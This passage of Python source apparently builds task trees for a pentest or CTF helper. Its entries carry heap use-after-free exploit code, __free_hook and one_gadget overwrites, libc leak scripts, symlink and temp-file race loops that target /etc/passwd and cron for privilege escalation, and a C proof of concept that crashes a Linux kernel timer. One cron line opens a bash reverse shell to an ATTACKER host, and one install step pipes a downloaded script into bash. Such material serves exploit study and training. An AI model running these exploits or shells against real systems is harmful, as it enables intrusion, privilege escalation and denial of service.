                                    'Write via one pointer visible in other',
                                    'UAF primitive established'
                                ],
                                'next_steps': [
                                    'Identify sensitive structs to overlap',
                                    'Overwrite function pointers (FILE vtable, __free_hook)',
                                    'Trigger overwritten function call',
                                    'Adapt technique to target binary'
                                ],
                                'alternatives': [
                                    'House of Force: overflow top chunk size',
                                    'Tcache poisoning (if glibc < 2.32)',
                                    'Fastbin dup: double-free in fastbin'
                                ]
                            }
                        }
                    ]
                },

                # Phase 3: Heap Grooming
                {
                    'id': 'heap-grooming-uaf',
                    'name': 'Phase 3: Heap Grooming for UAF',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'control-heap-layout',
                            'name': 'Control Heap Layout via Grooming',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Manipulate heap state to control which freed chunk gets reused',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'ADVANCED'],
                                'notes': '''Heap Grooming Technique:

Goal: Ensure freed victim chunk is reused by attacker-controlled allocation

Strategy:
1. **Fill heap** with objects of target size
2. **Free victim** object (contains function pointer, etc.)
3. **Free all filler** objects (in specific order)
4. **Allocate attacker struct** (same size as victim)
   - Should reuse victim's freed chunk
5. **Write attacker data** into chunk
6. **Trigger UAF** on original victim pointer
   - Now points to attacker-controlled data!

Example (CTF-style):
```c
// 1. Create notes (allocates chunks)
create_note(0, 8, "dummy");   // note0: malloc(8) for content
create_note(1, 8, "dummy");   // note1: malloc(8) for content

// 2. Free notes (chunks go to fastbin/tcache)
delete_note(0);  // Free note0 content chunk
delete_note(1);  // Free note1 content chunk
// Fastbin: [note1_content, note0_content]

// 3. Create note with content size = 8
create_note(2, 8, "\\x00\\x00\\x00\\x00\\x40\\x06\\x40\\x00");
// note2 content chunk reuses note1's freed chunk!
// Can now overwrite what was note1's function pointer

// 4. Use-after-free: call note1's function
show_note(1);  // Calls overwritten function pointer → WIN!
```

Key Factors:
- **Size matching**: Allocator reuses same-sized chunks
- **Free order**: Affects allocation order (fastbin LIFO)
- **Allocator state**: tcache vs fastbin vs unsorted

Debugging:
```gdb
gef➤ heap chunks          # Show all chunks
gef➤ heap bins            # Show bin contents
gef➤ vis_heap_chunks      # Visualize layout
```

Reference: https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/use_after_free/#example
''',
                                'success_indicators': [
                                    'Heap layout controlled',
                                    'Victim chunk reused by attacker allocation',
                                    'Attacker data written to old victim location',
                                    'UAF triggered successfully'
                                ],
                                'next_steps': [
                                    'Test grooming sequence in GDB',
                                    'Verify chunk reuse with heap visualization',
                                    'Adjust free/alloc order if needed',
                                    'Overwrite sensitive data (function pointers, flags)'
                                ],
                                'alternatives': [
                                    'Spray heap: allocate many objects to force predictable layout',
                                    'Drain bins: control which bins are used',
                                    'Size manipulation: craft specific sizes to influence bins'
                                ]
                            }
                        },
                        {
                            'id': 'exploit-note-taking-program',
                            'name': 'Exploit Note-Taking Program UAF',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Classic UAF pattern: overwrite function pointer in freed note struct',
                                'tags': ['OSCP:MEDIUM', 'CTF', 'PRACTICAL'],
                                'notes': '''Classic Note Program UAF:

Vulnerable Pattern:
```c
struct note {
    void (*print)(void);  // Function pointer (8 bytes)
    char *content;        // Pointer to content (8 bytes)
};

// note info: malloc(16) - contains function pointer + content ptr
// note content: malloc(size) - contains user data

void create_note(int id, size_t size, char *data) {
    notes[id] = malloc(16);  // 16 bytes = 2 pointers
    notes[id]->print = &print_note_safe;
    notes[id]->content = malloc(size);
    memcpy(notes[id]->content, data, size);
}

void delete_note(int id) {
    free(notes[id]->content);
    free(notes[id]);
    // BUG: notes[id] not set to NULL! (dangling pointer)
}

void show_note(int id) {
    notes[id]->print();  // UAF if note was freed!
}
```

Exploitation:
1. Create note0 (content size > 8)
2. Create note1 (content size > 8)
3. Free note0, free note1
   - note0 and note1 structs go to fastbin (16 bytes)
   - Contents go to respective bins
4. Create note2 with **content size = 8**
   - Content allocation reuses note1's struct!
   - Write address of win() function at offset 0
5. Call show_note(1)
   - Dereferences freed note1->print
   - Now points to win() function!

Exploit Code:
```python
from pwn import *

# Addresses
win_addr = 0x400640  # Address of win() function

create_note(0, 100, b"AAAA")
create_note(1, 100, b"BBBB")

delete_note(0)
delete_note(1)

# Overwrite note1's function pointer
payload = p64(win_addr)
create_note(2, 8, payload)

# Trigger UAF
show_note(1)  # Calls win()
```
''',
                                'success_indicators': [
                                    'Function pointer overwritten',
                                    'win() function called',
                                    'Shell or flag obtained'
                                ],
                                'alternatives': [
                                    'Overwrite content pointer instead of function pointer',
                                    'Use FILE struct vtable overwrite',
                                    'Target __free_hook or __malloc_hook'
                                ]
                            }
                        },
                        {
                            'id': 'array-index-uaf',
                            'name': 'Array Index Manipulation for UAF',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Exploit UAF where array index is stored in freed chunk',
                                'tags': ['OSCP:MEDIUM', 'CTF', 'GROOMING'],
                                'notes': '''Array Index UAF Pattern:

Scenario:
- Program stores array index in each allocated chunk
- Need specific value (e.g., 4) in target chunk
- Freed chunks retain data until overwritten

Vulnerability:
```c
for(int i = 0; i < n; i++) {
    chunks[i] = malloc(size);
    *(int*)chunks[i] = i;  // Store index
}
```

Grooming Attack:
```c
// 1. Allocate 5 chunks (indices 0-4)
for(int i = 0; i < 5; i++) alloc(i);
// chunk[4] contains value 4

// 2. Free all chunks
for(int i = 0; i < 5; i++) free(i);
// Fastbin (LIFO): [4, 3, 2, 1, 0]

// 3. Allocate target chunk
// First allocation reuses chunk[4] which has value 4!
alloc_target();  // Reuses chunk with 4 inside

// 4. Program checks value
if (*(int*)target_chunk == 4) {
    print_flag();  // WIN!
}
```

Why This Works:
- Allocator doesn't clear freed memory
- Last chunk freed (index 4) is first reallocated (LIFO)
- Old data persists until overwritten
- Program logic uses stale data

CTF Example: PicoCTF areyouroot
- Need to set is_admin = 1
- Allocate, write 1, free, realloc
- New allocation reuses chunk with 1 still inside

Reference: https://guyinatuxedo.github.io/26-heap_grooming/pico_areyouroot/
''',
                                'success_indicators': [
                                    'Target value remains in freed chunk',
                                    'Chunk reallocated with desired value',
                                    'Flag/access obtained'
                                ],
                                'alternatives': [
                                    'Overwrite after reallocation instead of relying on stale data',
                                    'Use heap spray to fill with target value',
                                    'Manipulate allocator bins for predictable reuse'
                                ]
                            }
                        }
                    ]
                },

                # Phase 4: Advanced UAF
                {
                    'id': 'advanced-uaf-techniques',
                    'name': 'Phase 4: Advanced UAF Techniques',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'hitcon-setjmp-technique',
                            'name': 'HITCON 2024 Setjmp: Unsorted Split Overlap',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Advanced technique: first-fit unsorted bin split to pivot to __free_hook',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'CTF'],
                                'notes': '''HITCON Quals 2024 Setjmp Technique:

Primitive: Unsorted bin splitting → overlapping chunks → __free_hook overwrite

Attack Chain:
1. **Drain tcache** for target size
2. **Free large chunk** (> 0x420) → unsorted bin
3. **Allocate smaller size** → splits unsorted chunk
4. **Allocate again** → leftover overlaps existing chunk
5. **Overwrite overlapped chunk** with fake chunk metadata
6. **Free overlapped chunk** → calls __free_hook
7. **__free_hook points to one_gadget** → shell!

Key Insights:
- Requires heap leak (for safe-linking bypass)
- Leverages unsorted bin splitter (not tcache)
- Creates overlapping pointers for arbitrary write
- Targets __free_hook (removed in glibc 2.34+)

Alternative Targets (glibc >= 2.34):
- FILE struct vtable (_IO_FILE_plus)
- _rtld_global → _dl_fini pointer
- GOT entries (if partial RELRO)
- Stack pointer in TLS

Write-up: https://ctftime.org/writeup/39355
CTF Challenge: 2024 HITCON Quals Setjmp

Techniques Applied:
1. Unsorted bin first-fit
2. Heap grooming
3. Overlapping chunk creation
4. Fake chunk crafting
5. Hook overwrite
''',
                                'success_indicators': [
                                    'Overlapping chunks created',
                                    '__free_hook overwritten',
                                    'one_gadget executed',
                                    'Shell obtained'
                                ],
                                'alternatives': [
                                    'FILE struct attack: _IO_str_jumps overwrite',
                                    'House of Storm: unsorted bin attack variant',
                                    'House of Husk: _printf_buffer_write overwrite'
                                ]
                            }
                        },
                        {
                            'id': 'angstrom-heapify',
                            'name': 'Angstrom CTF 2024: Heapify Unsorted Leak',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Use unsorted bin splitting to leak libc and create overlapping chunks',
                                'tags': ['OSCP:LOW', 'CTF', 'LEAK'],
                                'notes': '''Angstrom CTF 2024 Heapify Technique:

Goal: Leak libc address + gain overlapping chunks

Attack Steps:
1. **Allocate large chunk** (0x500)
2. **Free it** → goes to unsorted bin
3. Unsorted bin: fd/bk pointers point to main_arena in libc!
4. **Allocate smaller chunk** (0x400) → splits unsorted
5. **Read freed chunk** → leak fd pointer → calculate libc base
6. **Allocate again** (0x400) → leftover overlaps
7. **Arbitrary write** via overlap → RCE

Unsorted Bin Leak:
```
Unsorted bin chunk structure (when freed):
+0x00: prev_size
+0x08: size
+0x10: fd  (points to main_arena)  ← LEAK THIS!
+0x18: bk  (points to main_arena)
+0x20: user data...
```

Python Exploit:
```python
# Allocate and free large chunk
alloc(0, 0x500)
free(0)

# Allocate smaller to split unsorted bin
alloc(1, 0x400)

# Read freed chunk to leak libc
leak = read(0, 8)
main_arena = u64(leak)
libc_base = main_arena - libc.symbols['main_arena']
system = libc_base + libc.symbols['system']

# Create overlap and overwrite __free_hook
alloc(2, 0x400)  # Overlap with existing chunk
write(2, p64(system))
free_with_string("/bin/sh")  # Triggers system("/bin/sh")
```

Write-up: https://hackmd.io/@aneii11/H1S2snV40
''',
                                'success_indicators': [
                                    'libc leak obtained from unsorted bin fd',
                                    'libc base address calculated',
                                    'Overlapping chunks created',
                                    'RCE achieved'
                                ],
                                'alternatives': [
                                    'Leak via tcache bins (glibc >= 2.32 requires key)',
                                    'Leak via FILE struct _IO_2_1_stdout_',
                                    'Partial overwrite: use 12-bit brute-force for ASLR'
                                ]
                            }
                        },
                        {
                            'id': 'arm64-uaf-exploitation',
                            'name': 'ARM64 UAF: Password Bypass',
                            'type': 'manual',
                            'metadata': {
                                'description': 'ARM64-specific UAF exploitation for authentication bypass',
                                'tags': ['OSCP:MEDIUM', 'ARM64', 'PRACTICAL'],
                                'notes': '''ARM64 UAF Pattern (from 8ksec.io):

Vulnerability:
```c
struct user {
    char username[32];
    char *password;  // Pointer to heap-allocated password
    int is_admin;
};

// Create user
user *u = malloc(sizeof(user));
u->password = malloc(64);
strcpy(u->password, "secret");

// Free user (but pointer remains)
free(u);

// Later: allocate different object
data *d = malloc(sizeof(user));  // Reuses u's freed memory
// Can now control u->password pointer location!

// UAF: check password
if (strcmp(u->password, input) == 0) {
    grant_access();  // Bypassed!
}
```

ARM64 Exploitation:
1. **Create user** object (malloc returns x0)
2. **Note address** of password field (+40 bytes)
3. **Free user** object
4. **Create note** object (reuses freed memory)
5. **Write to note** at offset 40 → overwrites password pointer
6. **Point password to controlled data**
7. **Verify password** check → bypassed!

GDB Commands (ARM64):
```gdb
b malloc
commands
  silent
  printf "malloc(%ld) = %p\\n", $x0, $x0
  c
end

b free
commands
  silent
  printf "free(%p)\\n", $x0
  c
end
```

Key ARM64 Differences:
- Arguments in x0-x7 (not rdi, rsi like x86-64)
- Return value in x0
- Stack pointer: sp (not rsp)
- Function prologue: stp x29, x30, [sp, #-16]!

Reference: https://8ksec.io/arm64-reversing-and-exploitation-part-2-use-after-free/
''',
                                'success_indicators': [
                                    'User object freed and reused',
                                    'Password pointer overwritten',
                                    'Authentication bypassed',
                                    'Access granted'
                                ],
                                'alternatives': [
                                    'Overwrite is_admin flag directly',
                                    'Overwrite function pointer in struct',
                                    'Point password to empty string or known value'
                                ]
                            }
                        }
                    ]
                }
            ]
        }

    def _create_race_condition_tree(self, binary_path: str, platform: str) -> Dict[str, Any]:
        """Create race condition (TOCTOU) exploitation task tree"""
        return {
            'id': 'race-condition-exploitation',
            'name': 'Race Condition (TOCTOU) Exploitation',
            'type': 'parent',
            'children': [
                # Phase 1: Identify Race Conditions
                {
                    'id': 'race-condition-identification',
                    'name': 'Phase 1: Identify Race Conditions',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'understand-toctou',
                            'name': 'Understand TOCTOU Fundamentals',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Learn Time-Of-Check-Time-Of-Use race condition concepts',
                                'tags': ['OSCP:MEDIUM', 'THEORY', 'KERNEL'],
                                'notes': '''Time-Of-Check-Time-Of-Use (TOCTOU):

What is TOCTOU?
1. **Check**: Program checks a condition
2. **Window**: Brief time gap
3. **Use**: Program acts based on check result
4. **Attack**: Attacker changes state during window

Classic Example (File System):
```c
// Check if file is safe
if (access("/tmp/file", R_OK) == 0) {  // TIME-OF-CHECK
    // Window: attacker can change /tmp/file here!
    fd = open("/tmp/file", O_RDONLY);   // TIME-OF-USE
}
```

Attack:
```bash
# Terminal 1 (victim)
./vulnerable_program

# Terminal 2 (attacker) - rapid loop
while true; do
    ln -sf /etc/passwd /tmp/file
    ln -sf /tmp/safe_file /tmp/file
done
```

Kernel TOCTOU (CVE-2025-38352):
- Check: lock_task_sighand() succeeds
- Use: Process timer expiry outside lock
- Window: Task exits, timer deletion races
- Result: Kernel memory corruption

Exploitation Primitive:
- Create small window between check and use
- Exploit concurrent modification
- Timing-dependent (not always reliable)
''',
                                'success_indicators': [
                                    'TOCTOU window identified',
                                    'Check-use sequence documented',
                                    'State transition possible during window'
                                ],
                                'next_steps': [
                                    'Measure window size (nanoseconds to milliseconds)',
                                    'Test with concurrent threads/processes',
                                    'Increase success rate with amplification'
                                ]
                            }
                        },
                        {
                            'id': 'identify-file-toctou',
                            'name': 'Identify File-Based TOCTOU',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Find TOCTOU vulnerabilities in file operations',
                                'tags': ['OSCP:HIGH', 'FILESYSTEM', 'MANUAL'],
                                'notes': '''Common File TOCTOU Patterns:

1. **access() + open()**:
```c
if (access(path, R_OK) == 0) {  // Check
    fd = open(path, O_RDONLY);  // Use
}
```

2. **stat() + open()**:
```c
struct stat st;
if (stat(path, &st) == 0 && st.st_uid == getuid()) {  // Check
    fd = open(path, O_RDONLY);  // Use
}
```

3. **Temporary file race**:
```c
FILE *fp = fopen("/tmp/data", "w");  // Check if exists
fprintf(fp, "sensitive data");       // Use
```

Detection Commands:
```bash
# Find access() followed by open()
grep -n "access\\|open" program.c

# Find stat() followed by open()
grep -n "stat\\|open" program.c

# Find temporary file operations
find program.c -exec grep -l "/tmp" {} \\\\;

# ltrace to see syscall sequence
ltrace -e access,open,stat ./program
```

Safe Alternatives:
- Use open() with O_NOFOLLOW, O_EXCL
- Use fstat() on open fd instead of stat() on path
- Use file descriptors throughout (not paths)
- Set umask before temp file creation
''',
                                'success_indicators': [
                                    'access()/stat() + open() pattern found',
                                    'Temporary file operations identified',
                                    'Race window estimated'
                                ],
                                'alternatives': [
                                    'Static analysis: CodeQL, semgrep for TOCTOU',
                                    'Dynamic: strace -f to see file operations',
                                    'Fuzzing: rapidly modify files during program execution'
                                ]
                            }
                        },
                        {
                            'id': 'kernel-toctou-identification',
                            'name': 'Identify Kernel TOCTOU (CVE-2025-38352)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Understand POSIX CPU timers TOCTOU race in Linux kernel',
                                'tags': ['OSCP:LOW', 'KERNEL', 'CVE'],
                                'notes': '''POSIX CPU Timers TOCTOU (CVE-2025-38352):

Affected: Linux kernel with CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n

Vulnerability Pattern:
```c
// IRQ context: timer expiry
handle_posix_cpu_timers(task) {
    lock_task_sighand(task, &flags);        // LOCK
    collect_timerqueue(..., &firing);       // Mark timers firing
    unlock_task_sighand(task, &flags);      // UNLOCK ← RACE WINDOW

    // Process firing list outside lock
    list_for_each_entry_safe(timer, ..., &firing) {
        cpu_timer_fire(timer);              // Use timer
    }
}

// Concurrent thread: timer deletion
posix_cpu_timer_del(timer) {
    if (!lock_task_sighand(task, &flags))   // Fails if task exiting
        return;                              // Skips firing check!

    if (timer->firing)                      // Check if in-flight
        return;                              // Would protect, but not reached

    // Delete timer (corrupts state)
}
```

Race Condition:
1. IRQ: lock → mark firing → **unlock**
2. **Window**: Task exits, reaping begins
3. Thread: timer_delete() called
4. lock_task_sighand() FAILS (task exiting)
5. Deletion proceeds WITHOUT checking firing flag
6. Corruption: timer deleted while being processed

Impact:
- Kernel memory corruption (timer structures)
- Immediate crash (DoS)
- Privilege escalation primitive (with additional techniques)

Affected Configs:
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n (IRQ path)
- Android kernels before fix (2025-09 bulletin)
- Some embedded Linux systems
''',
                                'success_indicators': [
                                    'Kernel config identified',
                                    'TOCTOU window understood',
                                    'Vulnerable kernel confirmed'
                                ],
                                'next_steps': [
                                    'Check kernel config: zgrep POSIX_CPU_TIMERS_TASK_WORK /proc/config.gz',
                                    'Test kernel version: uname -r',
                                    'Research exploit development',
                                    'Set up test environment (VM/QEMU)'
                                ]
                            }
                        }
                    ]
                },

                # Phase 2: Exploit File TOCTOU
                {
                    'id': 'file-toctou-exploitation',
                    'name': 'Phase 2: Exploit File-Based TOCTOU',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'symlink-race-attack',
                            'name': 'Symlink Race Attack',
                            'type': 'command',
                            'metadata': {
                                'command': 'while true; do ln -sf /etc/passwd /tmp/target 2>/dev/null; ln -sf /tmp/safe /tmp/target 2>/dev/null; done &',
                                'description': 'Rapidly swap symlink target to win TOCTOU race',
                                'tags': ['OSCP:HIGH', 'FILESYSTEM', 'PRIVESC'],
                                'flag_explanations': {
                                    'while true': 'Infinite loop to maximize race window hits',
                                    'ln -sf': 'Create symbolic link, force overwrite',
                                    '/etc/passwd': 'Target sensitive file to read',
                                    '/tmp/target': 'Path used by vulnerable program',
                                    '2>/dev/null': 'Suppress error messages',
                                    '&': 'Run in background'
                                },
                                'success_indicators': [
                                    'Symlink rapidly alternates between targets',
                                    'Vulnerable program opens /etc/passwd',
                                    'Sensitive data leaked',
                                    'Root file written via privileged program'
                                ],
                                'failure_indicators': [
                                    'Symlink creation rate too slow',
                                    'Vulnerable program uses O_NOFOLLOW',
                                    'File descriptor used instead of path',
                                    'SELinux/AppArmor blocks symlink attack'
                                ],
                                'next_steps': [
                                    'Run vulnerable program in parallel',
                                    'Monitor with: watch -n 0.1 ls -l /tmp/target',
                                    'Increase success rate: run multiple race loops',
                                    'Test with strace to see which file is opened'
                                ],
                                'alternatives': [
                                    'Hard link race (if target is writable)',
                                    'Rename race: mv /tmp/safe /tmp/target repeatedly',
                                    'Directory race: swap entire directory path',
                                    'Python: use os.symlink() in tight loop'
                                ],
                                'notes': '''Stop background process with: killall ln

For privilege escalation:
1. Find setuid binary with TOCTOU
2. Race to make it write to /etc/passwd or /etc/shadow
3. Inject new root user entry
'''
                            }
                        },
                        {
                            'id': 'tmpfile-race-exploit',
                            'name': 'Temporary File Race Exploitation',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Exploit predictable temporary file creation',
                                'tags': ['OSCP:MEDIUM', 'FILESYSTEM'],
                                'notes': '''Temporary File Race:

Vulnerable Pattern:
```c
// Predictable temp file name
sprintf(tmpfile, "/tmp/program.%d", getpid());
FILE *fp = fopen(tmpfile, "w");  // Race here!
fprintf(fp, "sensitive data");
```

Attack Steps:
1. **Predict filename**: /tmp/program.PID
2. **Pre-create symlink**: ln -s /etc/cron.d/backdoor /tmp/program.12345
3. **Trigger program** with PID 12345
4. **Program writes to symlink** → writes to /etc/cron.d/backdoor
5. **Cron executes backdoor** → privilege escalation!

Bash Exploit:
```bash
#!/bin/bash
# Race vulnerable program

# Find target PID range
while true; do
    for pid in {10000..20000}; do
        # Pre-create symlink
        ln -sf /etc/cron.d/backdoor /tmp/program.$pid 2>/dev/null

        # Check if vulnerable program running
        if ps aux | grep -q "vulnerable.*$pid"; then
            echo "[+] Hit PID $pid!"
            break 2
        fi
    done
done

# Wait for cron to execute
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" > /tmp/trigger
```

Prevention:
- Use mkstemp() for secure temp files
- Set O_EXCL flag to fail if file exists
- Use /run/user/$UID/ instead of /tmp
- Set restrictive umask: umask 077
''',
                                'success_indicators': [
                                    'Temp file creation predicted',
                                    'Symlink pre-created successfully',
                                    'Program writes to attacker-controlled path',
                                    'Privilege escalation achieved'
                                ],
                                'alternatives': [
                                    'Hard link attack (if fs supports)',
                                    'Directory traversal in temp path',
                                    'Exploit umask misconfiguration'
                                ]
                            }
                        }
                    ]
                },

                # Phase 3: Kernel TOCTOU Exploitation
                {
                    'id': 'kernel-toctou-exploitation',
                    'name': 'Phase 3: Kernel TOCTOU Exploitation (CVE-2025-38352)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'setup-kernel-exploit-env',
                            'name': 'Setup Kernel Exploit Environment',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Prepare environment for kernel TOCTOU exploitation',
                                'tags': ['OSCP:LOW', 'KERNEL', 'SETUP'],
                                'notes': '''Kernel Exploit Environment Setup:

Prerequisites:
1. **Vulnerable kernel**:
   - CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n
   - Linux kernel before CVE-2025-38352 fix
   - Check: zgrep POSIX_CPU_TIMERS_TASK_WORK /proc/config.gz

2. **Development tools**:
   - gcc with kernel headers
   - gdb (for debugging)
   - QEMU (for safe testing)

3. **Test VM setup**:
```bash
# Build vulnerable kernel
cd linux-source
make menuconfig
# Disable: CONFIG_POSIX_CPU_TIMERS_TASK_WORK
make -j$(nproc)

# Setup QEMU
qemu-system-x86_64 \\
  -kernel arch/x86_64/boot/bzImage \\
  -initrd rootfs.cpio.gz \\
  -append "console=ttyS0" \\
  -nographic \\
  -enable-kvm
```

4. **Kernel debugging**:
```bash
# Enable debug symbols
CONFIG_DEBUG_INFO=y
CONFIG_GDB_SCRIPTS=y

# QEMU with GDB server
qemu-system-x86_64 ... -s -S

# Connect GDB
gdb vmlinux
(gdb) target remote :1234
(gdb) continue
```

Safety Note:
- **Test in VM only** - kernel exploits can crash system
- Take snapshots before testing
- Use disposable VM
''',
                                'success_indicators': [
                                    'Vulnerable kernel compiled',
                                    'QEMU VM boots successfully',
                                    'GDB debugging works',
                                    'Safe test environment ready'
                                ],
                                'alternatives': [
                                    'Use Docker with --privileged for safer testing',
                                    'Cloud VM with snapshots',
                                    'Hardware serial console for debugging'
                                ]
                            }
                        },
                        {
                            'id': 'trigger-posix-timer-race',
                            'name': 'Trigger POSIX CPU Timer Race',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create timer and concurrent deletion to trigger TOCTOU race',
                                'tags': ['OSCP:LOW', 'KERNEL', 'EXPLOIT'],
                                'notes': '''POSIX Timer Race Exploit (DoS PoC):

Exploit Strategy:
1. Create thread with CPU timer
2. Set very short expiry (triggers IRQ path frequently)
3. Thread exits (starts reaping process)
4. Concurrent thread hammers timer_delete()
5. Race: expiry vs deletion during task exit

PoC Code:
```c
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>

timer_t timer_id;
volatile int exit_flag = 0;

void* target_thread(void *arg) {
    // This thread will exit, triggering the race
    while(!exit_flag) {
        usleep(100);  // Keep thread alive briefly
    }
    return NULL;  // Exit triggers task cleanup
}

void* deleter_thread(void *arg) {
    // Hammer timer_delete() during exit
    while(1) {
        timer_delete(timer_id);  // Race with expiry handler
    }
}

int main() {
    pthread_t target, deleter;

    // Create target thread
    pthread_create(&target, NULL, target_thread, NULL);

    // Create CPU timer attached to target thread
    struct sigevent sev = {0};
    sev.sigev_notify = SIGEV_SIGNAL;
    sev.sigev_signo = SIGUSR1;
    timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer_id);

    // Set very short expiry to maximize IRQ triggers
    struct itimerspec its = {0};
    its.it_value.tv_nsec = 1;     // Fire ASAP
    its.it_interval.tv_nsec = 1;  // Re-fire continuously
    timer_settime(timer_id, 0, &its, NULL);

    // Start deletion thread
    pthread_create(&deleter, NULL, deleter_thread, NULL);

    // Trigger exit after brief delay
    usleep(10000);  // 10ms
    exit_flag = 1;

    pthread_join(target, NULL);
    // Crash typically happens here or shortly after

    return 0;
}
```

Compile:
```bash
gcc -o timer_race timer_race.c -lpthread -lrt
```

Run (in VM!):
```bash
./timer_race
# Expected: kernel crash (NULL deref, corruption panic)
dmesg | tail  # Check kernel logs
```

Amplification:
- High scheduler tick rate (kernel param)
- CPU load (stress testing)
- Repeated thread create/exit cycles
- Multiple concurrent deleters
''',
                                'success_indicators': [
                                    'Kernel crash observed',
                                    'dmesg shows timer corruption',
                                    'Race condition triggered',
                                    'DoS primitive confirmed'
                                ],
                                'next_steps': [
                                    'Analyze crash dump for exploitation potential',
                                    'Control timer callback function pointer',
                                    'Heap spray for reliable corruption',
                                    'Research privilege escalation techniques'
                                ],
                                'alternatives': [
                                    'Use process-wide timer (CLOCK_PROCESS_CPUTIME_ID)',
                                    'Test on real Android device (affected versions)',
                                    'Fuzz timer parameters for different behaviors'
                                ]
                            }
                        },
                        {
                            'id': 'kernel-race-mitigation',
                            'name': 'Check for Race Mitigations',
                            'type': 'command',
                            'metadata': {
                                'command': 'cat /proc/sys/kernel/kptr_restrict; cat /proc/sys/kernel/dmesg_restrict; cat /proc/sys/kernel/yama/ptrace_scope',
                                'description': 'Check kernel hardening features that affect exploitation',
                                'tags': ['OSCP:LOW', 'KERNEL', 'RECON'],
                                'flag_explanations': {
                                    'kptr_restrict': '0=unrestricted, 1=restricted, 2=hidden (affects /proc/kallsyms leaks)',
                                    'dmesg_restrict': '0=allowed, 1=restricted (prevents kernel log reading)',
                                    'ptrace_scope': '0=classic, 1=restricted, 2=admin-only, 3=disabled'
                                },
                                'success_indicators': [
                                    'kptr_restrict=0: kernel addresses visible',
                                    'dmesg_restrict=0: can read kernel logs',
                                    'ptrace_scope=0: debugging allowed'
                                ],
                                'failure_indicators': [
                                    'All restrictions enabled (hardened system)',
                                    'KASLR + kptr_restrict=2: no leak primitives',
                                    'SELinux/AppArmor enforcing'
                                ],
                                'next_steps': [
                                    'If restricted: find info leak primitive',
                                    'Check for SMAP/SMEP: grep -E "smap|smep" /proc/cpuinfo',
                                    'Identify kernel version: uname -r',
                                    'Search for known bypass techniques'
                                ],
                                'alternatives': [
                                    'Check /proc/kallsyms for kernel symbols',
                                    'dmesg | grep -i "protection" for hardening features',
                                    'checksec --kernel (if installed)'
                                ],
                                'notes': '''Modern Kernel Protections:
- KASLR: Randomize kernel base address
- SMEP: Prevent kernel executing user pages
- SMAP: Prevent kernel accessing user pages
- kptr_restrict: Hide kernel pointers
- SELinux/AppArmor: Mandatory access control

Bypass techniques often required for exploitation.
'''
                            }
                        }
                    ]
                }
            ]
        }

    def _create_heap_analysis_tree(self, binary_path: str, platform: str) -> Dict[str, Any]:
        """Create heap analysis and visualization task tree"""
        return {
            'id': 'heap-analysis-tools',
            'name': 'Heap Analysis & Visualization',
            'type': 'parent',
            'children': [
                {
                    'id': 'gef-heap-commands',
                    'name': 'GEF Heap Inspection',
                    'type': 'command',
                    'metadata': {
                        'command': f'gdb {binary_path}',
                        'description': 'Use GEF (GDB Enhanced Features) for heap visualization',
                        'tags': ['OSCP:HIGH', 'HEAP', 'DEBUGGING'],
                        'flag_explanations': {
                            'gdb': 'GNU Debugger with GEF extension'
                        },
                        'success_indicators': [
                            'GEF loaded (colorized output)',
                            'Heap commands available',
                            'Chunks visualized'
                        ],
                        'notes': '''GEF Heap Commands:

Install GEF:
```bash
bash -c "$(wget https://gef.blah.cat/sh -O -)"
```

Essential Commands:
```gdb
heap chunks              # List all chunks
heap bins                # Show fastbin/tcache/unsorted bins
heap arenas              # Show all arenas
vis_heap_chunks          # Visual chunk layout
heap chunk <addr>        # Inspect specific chunk

# Breakpoints for heap ops
break malloc
break free
break realloc

# Trace allocations
catch syscall brk mmap munmap
```

Chunk Inspection:
```gdb
x/32gx <addr>            # Examine 32 8-byte words
x/40gx <addr-0x10>       # Include chunk metadata

# Chunk structure (64-bit):
# +0x00: prev_size
# +0x08: size (with flags in lower 3 bits)
# +0x10: user data starts here
```

Bin Visualization:
```gdb
heap bins fast           # Fastbins only
heap bins tcache         # tcache bins only
heap bins unsorted       # Unsorted bin
```

Tips:
- Set breakpoint after malloc: break *<addr>+offset
- Compare heap state before/after operations
- Track specific chunk through operations
''',
                        'alternatives': [
                            'pwndbg: similar to GEF with different commands',
                            'heaptrace: standalone heap tracer',
                            'rr record: record/replay debugging'
                        ]
                    }
                },
                {
                    'id': 'malloc-hook-analysis',
                    'name': 'Analyze Malloc Hooks (glibc < 2.34)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inspect and exploit __malloc_hook and __free_hook',
                        'tags': ['OSCP:MEDIUM', 'HEAP', 'GLIBC'],
                        'notes': '''Malloc Hooks (Deprecated in glibc 2.34):

Global Function Pointers:
- __malloc_hook: called before malloc()
- __free_hook: called before free()
- __realloc_hook: called before realloc()

Location (in GDB):
```gdb
p &__malloc_hook
p &__free_hook
x/gx &__malloc_hook     # View current value

# Should be NULL initially, or point to safe function
```

Exploitation:
1. **Gain arbitrary write** (via UAF, overflow, etc.)
2. **Overwrite hook** to point to one_gadget/system
3. **Trigger allocation** (calls hook)
4. **Shell obtained**

One-Gadget:
```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Outputs addresses where execve("/bin/sh") can be triggered
```

Example:
```python
libc_base = leak_libc()
one_gadget_offset = 0x4527a  # From one_gadget
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

# Overwrite __free_hook with one_gadget
arbitrary_write(free_hook, one_gadget_offset + libc_base)

